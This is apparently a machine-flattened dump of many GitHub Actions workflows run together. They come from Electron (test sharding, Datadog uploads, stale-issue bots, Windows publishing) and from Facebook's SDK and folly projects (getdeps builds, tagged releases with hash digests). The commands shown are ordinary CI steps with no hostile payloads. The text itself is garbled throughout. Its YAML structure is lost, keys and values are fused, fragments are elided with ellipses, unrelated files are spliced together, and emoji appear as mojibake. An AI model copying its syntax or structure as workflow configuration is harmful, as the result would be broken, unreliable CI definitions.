name: L ... riablesDownload Generated ArtifactsDownloa ... tifactsactions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093actions ... f5c8093generated_artifacts_${{ env.ARTIFACT_KEY }}generat ... _KEY }}./generated_artifacts_${{ matrix.build-type }}_${{ inputs.target-arch }}./gener ... arch }}name: g ... _KEY }}name: D ... tifactsDownload Src Artifactssrc_artifacts_${{ env.ARTIFACT_KEY }}src_art ... _KEY }}./src_artifacts_${{ matrix.build-type }}_${{ inputs.target-arch }}./src_a ... arch }}name: s ... _KEY }}Restore Generated ArtifactsRestore ... tifacts./src/electron/script/actions/restore-artifacts.sh./src/e ... acts.shname: R ... tifactsUnzip Dist, Mksnapshot & Chromedriver (win)Unzip D ... r (win)Set-ExecutionPolicy Bypass -Scope Process -Force
cd src/out/Default
Expand-Archive -Force dist.zip -DestinationPath ./
Expand-Archive -Force chromedriver.zip -DestinationPath ./
Expand-Archive -Force mksnapshot.zip -DestinationPath ./
name: U ... r (win)Unzip Dist, Mksnapshot & Chromedriver (unix)Unzip D ...  (unix)${{ inputs.target-platform != 'win' }}cd src/out/Default
unzip -:o dist.zip
unzip -:o chromedriver.zip
unzip -:o mksnapshot.zip
Import & Trust Self-Signed Codesigning Cert on MacOSImport  ... n MacOS${{ inputs.target-platform == 'macos' && inputs.target-arch == 'x64' }}${{ inp ... x64' }}sudo security authorizationdb write com.apple.trust-settings.admin allow
cd src/electron
./script/codesign/generate-identity.sh
name: I ... n MacOSInstall Datadog CLIcd src/electron
node script/yarn global add @datadog/datadog-ci
name: I ... dog CLIRun Electron TestsMOCHA_REPORTERmocha-multi-reportersmocha-m ... portersMOCHA_MULTI_REPORTERSMOCHA_M ... PORTERSmocha-junit-reporter, tapmocha-j ... er, tapELECTRON_DISABLE_SECURITY_WARNINGSELECTRO ... ARNINGSELECTRON_SKIP_NATIVE_MODULE_TESTSELECTRO ... E_TESTSDISPLAY:99.0':99.0'NPM_CONFIG_MSVS_VERSIONNPM_CON ... VERSION2022'2022'MOCHA_R ... porterscd src/electron
export ELECTRON_TEST_RESULTS_DIR=`pwd`/junit
# Get which tests are on this shard
tests_files=$(node script/split-tests ${{ matrix.shard }} ${{ inputs.target-platform == 'linux' && 3 || 2 }})

# Run tests
if [ "${{ inputs.target-platform }}" != "linux" ]; then
  echo "About to start tests"
  if [ "${{ inputs.target-platform }}" = "win" ]; then
    if [ "${{ inputs.target-arch }}" = "x86" ]; then
      export npm_config_arch="ia32"
    fi
    if [ "${{ inputs.target-arch }}" = "arm64" ]; then
      export ELECTRON_FORCE_TEST_SUITE_EXIT="true"
    fi
  fi
  node script/yarn test --runners=main --trace-uncaught --enable-logging --files $tests_files
else
  chown :builduser .. && chmod g+w ..
  chown -R :builduser . && chmod -R g+w .
  chmod 4755 ../out/Default/chrome-sandbox
  runuser -u builduser -- git config --global --add safe.directory $(pwd)
  if [ "${{ inputs.is-asan }}" == "true" ]; then
    cd ..
    ASAN_SYMBOLIZE="$PWD/tools/valgrind/asan/asan_symbolize.py --executable-path=$PWD/out/Default/electron"
    export ASAN_OPTIONS="symbolize=0 handle_abort=1"
    export G_SLICE=always-malloc
    export NSS_DISABLE_ARENA_FREE_LIST=1
    export NSS_DISABLE_UNLOAD=1
    export LLVM_SYMBOLIZER_PATH=$PWD/third_party/llvm-build/Release+Asserts/bin/llvm-symbolizer
    export MOCHA_TIMEOUT=180000
    echo "Piping output to ASAN_SYMBOLIZE ($ASAN_SYMBOLIZE)"
    cd electron
    runuser -u builduser -- xvfb-run script/actions/run-tests.sh script/yarn test --runners=main --trace-uncaught --enable-logging --files $tests_files | $ASAN_SYMBOLIZE
  else
    runuser -u builduser -- xvfb-run script/actions/run-tests.sh script/yarn test --runners=main --trace-uncaught --enable-logging --files $tests_files
  fi
fi
name: R ... n TestsUpload Test results to DatadogUpload  ... DatadogDD_ENVDD_SERVICEDD_API_KEY${{ secrets.DD_API_KEY }}DD_CIVISIBILITY_LOGS_ENABLEDDD_CIVI ... ENABLEDDD_TAGSos.architecture:${{ inputs.target-arch }},os.family:${{ inputs.target-platform }},os.platform:${{ inputs.target-platform }},asan:${{ inputs.is-asan }}"os.arc ... san }}"DD_ENV: ciif ! [ -z $DD_API_KEY ] && [ -f src/electron/junit/test-results-main.xml ]; then
  export DATADOG_PATH=`node src/electron/script/yarn global bin`
  $DATADOG_PATH/datadog-ci junit upload src/electron/junit/test-results-main.xml
fi          
name: U ... DatadogUpload Test ArtifactsUpload  ... tifactstest_artifacts_${{ env.ARTIFACT_KEY }}_${{ matrix.shard }}test_ar ... hard }}src/electron/spec/artifactssrc/ele ... tifactsif-no-files-foundignorename: t ... hard }}- name: ... runnersname: P ... on Test/home/huawei/github-actions-security/.github/workflows/electron_electron__pipeline-segment-node-nan-test.ymlPipeline Segment - Node/Nan TestPipelin ... an Testelectron-node-nan-test-${{ inputs.target-platform }}-${{ inputs.target-arch }}-${{ github.ref_protected == true && github.run_id || github.ref }}node-testsRun Node.js Testsgenerated_artifacts_${{ env.BUILD_TYPE }}_${{ env.TARGET_ARCH }}generat ... ARCH }}./generated_artifacts_${{ env.BUILD_TYPE }}_${{ env.TARGET_ARCH }}./gener ... ARCH }}name: g ... ARCH }}src_artifacts_linux_${{ env.TARGET_ARCH }}src_art ... ARCH }}./src_artifacts_linux_${{ env.TARGET_ARCH }}./src_a ... ARCH }}name: s ... ARCH }}Unzip Distcd src/out/Default
unzip -:o dist.zip
name: Unzip DistSetup Linux for Headless TestingSetup L ... Testingsh -e /etc/init.d/xvfb startsh -e / ... b startname: S ... Testingcd src
node electron/script/node-spec-runner.js --default --jUnitDir=junit
name: R ... s Testsnan-testsRun Nan Testse init -f --root=$(pwd) --out=Default ${{ inputs.gn-build-type }}
cd src
node electron/script/nan-spec-runner.js
name: Run Nan Testsnode-tests:name: P ... an Test/home/huawei/github-actions-security/.github/workflows/electron_electron__pull-request-labeled.ymlPull Request Labeledpull-request-labeled-backport-requestedpull-re ... questedbackport/requested label addedbackpor ... l addedgithub.event.label.name == 'backport/requested ðŸ—³'github. ... ted \u1f5f3\uddf3'Trigger Slack workflowTrigger ... orkflowslackapi/slack-github-action@b0fa283ad8fea605de13dc3f449259339835fc52slackap ... 835fc52webhook${{ secrets.BACKPORT_REQUESTED_SLACK_WEBHOOK_URL }}webhook-typewebhook-triggerpayload{
  "url": "${{ github.event.pull_request.html_url }}"
}
webhook ... URL }} name: T ... orkflow- name: ... orkflowpull-request-labeled-deprecation-review-completepull-re ... ompletedeprecation-review/complete label addeddepreca ... l addedgithub.event.label.name == 'deprecation-review/complete âœ…'github. ... lete \u2705'94âœ… Reviewed\u2705 Reviewedname: d ... l addedpull-re ... uested:name: P ... Labeled/home/huawei/github-actions-security/.github/workflows/electron_electron__scorecards.ymlScorecards supply-chain security44 17 * * 0'44 17 * * 0'cron: '44 17 * * 0'- cron: ...  * * 0'Scorecards analysisgithub/codeql-action/upload-sarif@ff0a06e83cb2de871e5a09832bc6a81e7276941fgithub/ ... 276941f- name: ... t code"/home/huawei/github-actions-security/.github/workflows/electron_electron__semantic.ymlCheck Semantic Commit"Check  ... Commit"statusespull-re ... yze PRsValidate PR Titlesemantic-pull-requestsemanti ... requestamannn/action-semantic-pull-request@0723387faaf9b38adef4775cd42cfd5155ed6017amannn/ ... 5ed6017validateSingleCommitvalidat ... : falsename: s ... request- name: ... requestmain:name: " ... Commit"/home/huawei/github-actions-security/.github/workflows/electron_electron__stable-prep-items.ymlCheck Stable Prep ItemsCheck S ... p Items0 */12 * * *'0 */12 * * *'cron:   ...  * * *'- cron: ...  * * *'check-stable-prep-itemscheck-s ... p-itemsFind Newest Release Project BoardFind Ne ... t Boardfind-project-numberset -eo pipefail
PROJECT_NUMBER=$(gh project list --owner electron --format json | jq -r '.projects | map(select(.title | test("^[0-9]+-x-y$"))) | max_by(.number) | .number')
echo "PROJECT_NUMBER=$PROJECT_NUMBER" >> "$GITHUB_OUTPUT"
Update Completed Stable Prep ItemsUpdate  ... p Itemsdsanders11/project-actions/completed-by@2134fe7cc71c58b7ae259c82a8e63c6058255678Prep Statusâœ… Complete\u2705 Complete${{ steps.find-project-number.outputs.PROJECT_NUMBER }}${{ ste ... MBER }}field: Prep Statusname: U ... p Itemsname: C ... p Itemscheck-s ... -items:/home/huawei/github-actions-security/.github/workflows/electron_electron__stale.ymlClose stale issues'Close stale issues'30 1 * * *'30 1 * * *'cron: '30 1 * * *'- cron: '30 1 * * *'days-before-close1750This issue has been automatically marked as stale. **If this issue is still affecting you, please leave any comment** (for example, "bump"), and we'll keep it open. If you have any new additional informationâ€”in particular, if this is still reproducible in the [latest version of Electron](https://www.electronjs.org/releases/stable) or in the [beta](https://www.electronjs.org/releases/beta)â€”please include it with your comment!
This issue has been closed due to inactivity, and will not be monitored.  If this is a bug and you can reproduce this issue on a [supported version of Electron](https://www.electronjs.org/docs/latest/tutorial/electron-timelines#timeline) please open a new issue and include instructions for reproducing the issue.
discussion,security ðŸ”’,enhancement :sparkles:,status/confirmed,stale-exempt"discus ... exempt"only-pr-labelsnot-a-real-labelrepo-to ... oken }}uses: a ...  v9.1.0pending-repro10blocked/need-reproUnfortunately, without a way to reproduce this issue, we're unable to continue investigation. This issue has been closed and will not be monitored further. If you're able to provide a minimal test case that reproduces this issue on a [supported version of Electron](https://www.electronjs.org/docs/latest/tutorial/electron-timelines#timeline) please open a new issue and include instructions for reproducing the issue.
name: ' ... issues'/home/huawei/github-actions-security/.github/workflows/electron_electron__windows-publish.ymlPublish Windowsrun-windows-publishCHROMIU ... RING }}${{ inputs.build-image-sha }}${{ inp ... -sha }}publish-x64-winpublish-arm64-winpublish-x86-wincheckout-windows:name: P ... Windows/home/huawei/github-actions-security/.github/workflows/facebook_facebook-android-sdk__needs-attention.ymlIssue Needs AttentionIssue N ... tentiontypes: createdapplyNeedsAttentionLabelapplyNe ... onLabelApply Needs Attention LabelApply N ... n Labelhramos/needs-attention@v1hramos/ ... tion@v1response-required-labelrespons ... d-labelwaiting-for-response'waitin ... sponse'needs-attention-labelneeds-a ... n-labelneeds-triage'needs-triage'name: A ... n LabelapplyNe ... nLabel:name: I ... tention/home/huawei/github-actions-security/.github/workflows/facebook_facebook-android-sdk__stale.ymlClose stale issues and PRs'Close  ... nd PRs'30 5 * * *'30 5 * * *'cron: '30 5 * * *'- cron: '30 5 * * *'actions/stale@v4Closing this issue after a prolonged period of inactivity. If this issue is still present in the latest release, please feel free to create a new issue with up-to-date information.'Closin ... ation.'Hey there, it looks like there has been no activity on this issue recently. Has the issue been fixed, or does it still require the community&#39;s attention? This issue may be closed if no further activity occurs. Thank you for your contributions.'Hey th ... tions.'7enable-statistics60acknowledged,needs-triage'acknow ... triage'close-i ... ation.'uses: a ... tale@v4- uses: ... tale@v4name: ' ... nd PRs'/home/huawei/github-actions-security/.github/workflows/facebook_facebook-ios-sdk__needs-attention.yml/home/huawei/github-actions-security/.github/workflows/facebook_facebook-ios-sdk__stale.yml/home/huawei/github-actions-security/.github/workflows/facebook_folly__TagIt.ymlv20*'v20*'- 'v20*'TagItcontent ... releaseArchive projectarchive_projectFILE_NAME=${GITHUB_REPOSITORY#*/}-${GITHUB_REF##*/}
git archive ${{ github.ref }} -o ${FILE_NAME}.zip
git archive ${{ github.ref }} -o ${FILE_NAME}.tar.gz
echo "file_name=${FILE_NAME}" >> $GITHUB_OUTPUT
name: A ... projectCompute digestscompute_digestsecho "tgz_256=$(openssl dgst -sha256 ${{ steps.archive_project.outputs.file_name }}.tar.gz)" >> $GITHUB_OUTPUT
echo "tgz_512=$(openssl dgst -sha512 ${{ steps.archive_project.outputs.file_name }}.tar.gz)" >> $GITHUB_OUTPUT
echo "zip_256=$(openssl dgst -sha256 ${{ steps.archive_project.outputs.file_name }}.zip)" >> $GITHUB_OUTPUT
echo "zip_512=$(openssl dgst -sha512 ${{ steps.archive_project.outputs.file_name }}.zip)" >> $GITHUB_OUTPUT
name: C ... digestsCreate Releasecreate_releaseactions/create-release@v1actions ... ease@v1tag_name${{ github.ref }}release_nameAutomated release from TagIt
<details>
  <summary>File Hashes</summary>
  <ul>
    <li>${{ steps.compute_digests.outputs.zip_256 }}</li>
    <li>${{ steps.compute_digests.outputs.zip_512 }}</li>
    <li>${{ steps.compute_digests.outputs.tgz_256 }}</li>
    <li>${{ steps.compute_digests.outputs.tgz_512 }}</li>
  </ul>
</details>
prereleasetag_nam ... .ref }}name: Create ReleaseUpload zipactions/upload-release-asset@v1actions ... sset@v1upload_url${{ steps.create_release.outputs.upload_url }}${{ ste ... _url }}asset_path./${{ steps.archive_project.outputs.file_name }}.zip./${{ s ...  }}.zipasset_name${{ steps.archive_project.outputs.file_name }}.zip${{ ste ...  }}.zipasset_content_typeapplication/zipupload_ ... _url }}name: Upload zipUpload tar.gz./${{ steps.archive_project.outputs.file_name }}.tar.gz./${{ s ... .tar.gz${{ steps.archive_project.outputs.file_name }}.tar.gz${{ ste ... .tar.gzapplication/gzipname: Upload tar.gz/home/huawei/github-actions-security/.github/workflows/facebook_folly__getdeps_linux.ymlcontent ... eckout)Show disk space at startShow di ... t startname: S ... t startFree up disk spacesudo rm -rf /usr/local/lib/androidsudo rm ... androidname: F ... k spaceShow disk space after freeing upShow di ... eing upname: S ... eing upUpdate system package infoUpdate  ... ge infosudo --preserve-env=http_proxy apt-get updatesudo -- ...  updatename: U ... ge infoInstall system depssudo --preserve-env=http_proxy python3 build/fbcode_builder/getdeps.py --allow-system-packages install-system-deps --recursive folly && sudo --preserve-env=http_proxy python3 build/fbcode_builder/getdeps.py --allow-system-packages install-system-deps --recursive patchelfsudo -- ... atchelfname: I ... em depsQuery pathspython3 build/fbcode_builder/getdeps.py --allow-system-packages query-paths --recursive --src-dir=. folly  >> "$GITHUB_OUTPUT"python3 ... OUTPUT"id: pathsFetch boost${{ steps.paths.outputs.boost_SOURCE }}${{ ste ... URCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests boostpython3 ... s boostname: Fetch boostFetch ninja${{ steps.paths.outputs.ninja_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests ninjapython3 ... s ninjaname: Fetch ninjaFetch cmake${{ steps.paths.outputs.cmake_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests cmakepython3 ... s cmakename: Fetch cmakeFetch double-conversionFetch d ... version${{ steps.paths.outputs.double-conversion_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests double-conversionpython3 ... versionname: F ... versionFetch fast_float${{ steps.paths.outputs.fast_float_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests fast_floatpython3 ... t_floatname: F ... t_floatFetch fmt${{ steps.paths.outputs.fmt_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests fmtpython3 ... sts fmtname: Fetch fmtFetch gflags${{ steps.paths.outputs.gflags_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests gflagspython3 ...  gflagsname: Fetch gflagsFetch glog${{ steps.paths.outputs.glog_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests glogpython3 ... ts glogname: Fetch glogFetch googletest${{ steps.paths.outputs.googletest_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests googletestpython3 ... gletestname: F ... gletestFetch libdwarf${{ steps.paths.outputs.libdwarf_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests libdwarfpython3 ... ibdwarfname: Fetch libdwarfFetch libevent${{ steps.paths.outputs.libevent_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests libeventpython3 ... ibeventname: Fetch libeventFetch zlib${{ steps.paths.outputs.zlib_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests zlibpython3 ... ts zlibname: Fetch zlibFetch lz4${{ steps.paths.outputs.lz4_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests lz4python3 ... sts lz4name: Fetch lz4Fetch snappy${{ steps.paths.outputs.snappy_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests snappypython3 ...  snappyname: Fetch snappyFetch zstd${{ steps.paths.outputs.zstd_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests zstdpython3 ... ts zstdname: Fetch zstdFetch autoconf${{ steps.paths.outputs.autoconf_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests autoconfpython3 ... utoconfname: Fetch autoconfFetch automake${{ steps.paths.outputs.automake_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests automakepython3 ... utomakename: Fetch automakeFetch libtool${{ steps.paths.outputs.libtool_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests libtoolpython3 ... libtoolname: Fetch libtoolFetch libiberty${{ steps.paths.outputs.libiberty_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests libibertypython3 ... bibertyname: F ... bibertyFetch libsodium${{ steps.paths.outputs.libsodium_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests libsodiumpython3 ... bsodiumname: F ... bsodiumFetch libunwind${{ steps.paths.outputs.libunwind_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests libunwindpython3 ... bunwindname: F ... bunwindFetch xz${{ steps.paths.outputs.xz_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests xzpython3 ... ests xzname: Fetch xzRestore boost from cacheRestore ... m cacherestore_boost${{ steps.paths.outputs.boost_INSTALL }}${{ ste ... TALL }}${{ steps.paths.outputs.boost_CACHE_KEY }}-install${{ ste ... installpath: $ ... TALL }}name: R ... m cacheBuild boost${{ steps.paths.outputs.boost_SOURCE && ! steps.restore_boost.outputs.cache-hit }}${{ ste ... -hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests boostname: Build boostSave boost to cachename: S ... o cacheRestore ninja from cacherestore_ninja${{ steps.paths.outputs.ninja_INSTALL }}${{ steps.paths.outputs.ninja_CACHE_KEY }}-installBuild ninja${{ steps.paths.outputs.ninja_SOURCE && ! steps.restore_ninja.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests ninjaname: Build ninjaSave ninja to cacheRestore cmake from cacherestore_cmake${{ steps.paths.outputs.cmake_INSTALL }}${{ steps.paths.outputs.cmake_CACHE_KEY }}-installBuild cmake${{ steps.paths.outputs.cmake_SOURCE && ! steps.restore_cmake.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests cmakename: Build cmakeSave cmake to cacheRestore double-conversion from cacherestore_double-conversionrestore ... version${{ steps.paths.outputs.double-conversion_INSTALL }}${{ steps.paths.outputs.double-conversion_CACHE_KEY }}-installBuild double-conversionBuild d ... version${{ steps.paths.outputs.double-conversion_SOURCE && ! steps.restore_double-conversion.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests double-conversionname: B ... versionSave double-conversion to cacheSave do ... o cacheRestore fast_float from cacherestore_fast_float${{ steps.paths.outputs.fast_float_INSTALL }}${{ steps.paths.outputs.fast_float_CACHE_KEY }}-installBuild fast_float${{ steps.paths.outputs.fast_float_SOURCE && ! steps.restore_fast_float.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests fast_floatname: B ... t_floatSave fast_float to cacheSave fa ... o cacheRestore fmt from cacherestore_fmt${{ steps.paths.outputs.fmt_INSTALL }}${{ steps.paths.outputs.fmt_CACHE_KEY }}-installBuild fmt${{ steps.paths.outputs.fmt_SOURCE && ! steps.restore_fmt.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests fmtname: Build fmtSave fmt to cacheRestore gflags from cacherestore_gflags${{ steps.paths.outputs.gflags_INSTALL }}${{ steps.paths.outputs.gflags_CACHE_KEY }}-installBuild gflags${{ steps.paths.outputs.gflags_SOURCE && ! steps.restore_gflags.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests gflagsname: Build gflagsSave gflags to cacheRestore glog from cacherestore_glog${{ steps.paths.outputs.glog_INSTALL }}${{ steps.paths.outputs.glog_CACHE_KEY }}-installBuild glog${{ steps.paths.outputs.glog_SOURCE && ! steps.restore_glog.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests glogname: Build glogSave glog to cacheRestore googletest from cacherestore_googletest${{ steps.paths.outputs.googletest_INSTALL }}${{ steps.paths.outputs.googletest_CACHE_KEY }}-installBuild googletest${{ steps.paths.outputs.googletest_SOURCE && ! steps.restore_googletest.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests googletestname: B ... gletestSave googletest to cacheSave go ... o cacheRestore libdwarf from cacherestore_libdwarf${{ steps.paths.outputs.libdwarf_INSTALL }}${{ steps.paths.outputs.libdwarf_CACHE_KEY }}-installBuild libdwarf${{ steps.paths.outputs.libdwarf_SOURCE && ! steps.restore_libdwarf.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests libdwarfname: Build libdwarfSave libdwarf to cacheSave li ... o cacheRestore libevent from cacherestore_libevent${{ steps.paths.outputs.libevent_INSTALL }}${{ steps.paths.outputs.libevent_CACHE_KEY }}-installBuild libevent${{ steps.paths.outputs.libevent_SOURCE && ! steps.restore_libevent.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests libeventname: Build libeventSave libevent to cacheRestore zlib from cacherestore_zlib${{ steps.paths.outputs.zlib_INSTALL }}${{ steps.paths.outputs.zlib_CACHE_KEY }}-installBuild zlib${{ steps.paths.outputs.zlib_SOURCE && ! steps.restore_zlib.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests zlibname: Build zlibSave zlib to cacheRestore lz4 from cacherestore_lz4${{ steps.paths.outputs.lz4_INSTALL }}${{ steps.paths.outputs.lz4_CACHE_KEY }}-installBuild lz4${{ steps.paths.outputs.lz4_SOURCE && ! steps.restore_lz4.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests lz4name: Build lz4Save lz4 to cacheRestore snappy from cacherestore_snappy${{ steps.paths.outputs.snappy_INSTALL }}${{ steps.paths.outputs.snappy_CACHE_KEY }}-installBuild snappy${{ steps.paths.outputs.snappy_SOURCE && ! steps.restore_snappy.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests snappyname: Build snappySave snappy to cacheRestore zstd from cacherestore_zstd${{ steps.paths.outputs.zstd_INSTALL }}${{ steps.paths.outputs.zstd_CACHE_KEY }}-installBuild zstd${{ steps.paths.outputs.zstd_SOURCE && ! steps.restore_zstd.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests zstdname: Build zstdSave zstd to cacheRestore autoconf from cacherestore_autoconf${{ steps.paths.outputs.autoconf_INSTALL }}${{ steps.paths.outputs.autoconf_CACHE_KEY }}-installBuild autoconf${{ steps.paths.outputs.autoconf_SOURCE && ! steps.restore_autoconf.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests autoconfname: Build autoconfSave autoconf to cacheSave au ... o cacheRestore automake from cacherestore_automake${{ steps.paths.outputs.automake_INSTALL }}${{ steps.paths.outputs.automake_CACHE_KEY }}-installBuild automake${{ steps.paths.outputs.automake_SOURCE && ! steps.restore_automake.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests automakename: Build automakeSave automake to cacheRestore libtool from cacherestore_libtool${{ steps.paths.outputs.libtool_INSTALL }}${{ steps.paths.outputs.libtool_CACHE_KEY }}-installBuild libtool${{ steps.paths.outputs.libtool_SOURCE && ! steps.restore_libtool.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests libtoolname: Build libtoolSave libtool to cacheRestore libiberty from cacherestore_libiberty${{ steps.paths.outputs.libiberty_INSTALL }}${{ steps.paths.outputs.libiberty_CACHE_KEY }}-installBuild libiberty${{ steps.paths.outputs.libiberty_SOURCE && ! steps.restore_libiberty.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests libibertyname: B ... bibertySave libiberty to cacheRestore libsodium from cacherestore_libsodium${{ steps.paths.outputs.libsodium_INSTALL }}${{ steps.paths.outputs.libsodium_CACHE_KEY }}-installBuild libsodium${{ steps.paths.outputs.libsodium_SOURCE && ! steps.restore_libsodium.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests libsodiumname: B ... bsodiumSave libsodium to cacheRestore libunwind from cacherestore_libunwind${{ steps.paths.outputs.libunwind_INSTALL }}${{ steps.paths.outputs.libunwind_CACHE_KEY }}-installBuild libunwind${{ steps.paths.outputs.libunwind_SOURCE && ! steps.restore_libunwind.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests libunwindname: B ... bunwindSave libunwind to cacheRestore xz from cacherestore_xz${{ steps.paths.outputs.xz_INSTALL }}${{ steps.paths.outputs.xz_CACHE_KEY }}-installBuild xz${{ steps.paths.outputs.xz_SOURCE && ! steps.restore_xz.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests xzname: Build xzSave xz to cacheBuild follypython3 build/fbcode_builder/getdeps.py --allow-system-packages build --src-dir=. folly  --project-install-prefix folly:/usr/localpython3 ... r/localname: Build follyCopy artifactspython3 build/fbcode_builder/getdeps.py --allow-system-packages fixup-dyn-deps --strip --src-dir=. folly _artifacts/linux  --project-install-prefix folly:/usr/local --final-install-prefix /usr/localname: Copy artifactsfolly_artifactsname: follyuses: a ... fact@v4Test follypython3 build/fbcode_builder/getdeps.py --allow-system-packages test --src-dir=. folly  --project-install-prefix folly:/usr/localname: Test follyShow disk space at endShow di ...  at endalways()name: S ...  at endname: linux/home/huawei/github-actions-security/.github/workflows/facebook_folly__getdeps_mac.ymlmacpython3 build/fbcode_builder/getdeps.py --allow-system-packages install-system-deps --recursive follypython3 ... e follyFetch openssl${{ steps.paths.outputs.openssl_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests opensslpython3 ... opensslname: Fetch opensslRestore openssl from cacherestore_openssl${{ steps.paths.outputs.openssl_INSTALL }}${{ steps.paths.outputs.openssl_CACHE_KEY }}-installBuild openssl${{ steps.paths.outputs.openssl_SOURCE && ! steps.restore_openssl.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --free-up-disk --no-tests opensslname: Build opensslSave openssl to cacheSave op ... o cachepython3 build/fbcode_builder/getdeps.py --allow-system-packages fixup-dyn-deps --src-dir=. folly _artifacts/mac  --project-install-prefix folly:/usr/local --final-install-prefix /usr/localname: mac/home/huawei/github-actions-security/.github/workflows/facebook_folly__getdeps_windows.ymlExport boost environmentExport  ... ronmentecho BOOST_ROOT=%BOOST_ROOT_1_83_0% >> %GITHUB_ENV%"echo B ... B_ENV%"cmdname: E ... ronmentFix Git configgit config --system core.longpaths true && git config --system core.autocrlf false && git config --system core.symlinks true
name: Fix Git configpython build/fbcode_builder/getdeps.py query-paths --recursive --src-dir=. folly  >> $env:GITHUB_OUTPUTpython  ... _OUTPUTpython build/fbcode_builder/getdeps.py fetch --no-tests boostpython  ... s boostpython build/fbcode_builder/getdeps.py fetch --no-tests libsodiumpython  ... bsodiumpython build/fbcode_builder/getdeps.py fetch --no-tests ninjapython  ... s ninjapython build/fbcode_builder/getdeps.py fetch --no-tests cmakepython  ... s cmakepython build/fbcode_builder/getdeps.py fetch --no-tests double-conversionpython  ... versionpython build/fbcode_builder/getdeps.py fetch --no-tests fast_floatpython  ... t_floatpython build/fbcode_builder/getdeps.py fetch --no-tests fmtpython  ... sts fmtpython build/fbcode_builder/getdeps.py fetch --no-tests gflagspython  ...  gflagspython build/fbcode_builder/getdeps.py fetch --no-tests glogpython  ... ts glogpython build/fbcode_builder/getdeps.py fetch --no-tests googletestpython  ... gletestpython build/fbcode_builder/getdeps.py fetch --no-tests libdwarfpython  ... ibdwarfpython build/fbcode_builder/getdeps.py fetch --no-tests lz4python  ... sts lz4Fetch jom${{ steps.paths.outputs.jom_SOURCE }}python build/fbcode_builder/getdeps.py fetch --no-tests jompython  ... sts jomname: Fetch jomFetch perl${{ steps.paths.outputs.perl_SOURCE }}python build/fbcode_builder/getdeps.py fetch --no-tests perlpython  ... ts perlname: Fetch perlpython build/fbcode_builder/getdeps.py fetch --no-tests opensslpython  ... opensslpython build/fbcode_builder/getdeps.py fetch --no-tests snappypython  ...  snappypython build/fbcode_builder/getdeps.py fetch --no-tests zlibpython  ... ts zlibpython build/fbcode_builder/getdeps.py fetch --no-tests zstdpython  ... ts zstdpython build/fbcode_builder/getdeps.py fetch --no-tests libeventpython  ... ibeventpython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests boostpython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests libsodiumpython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests ninjapython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests cmakepython 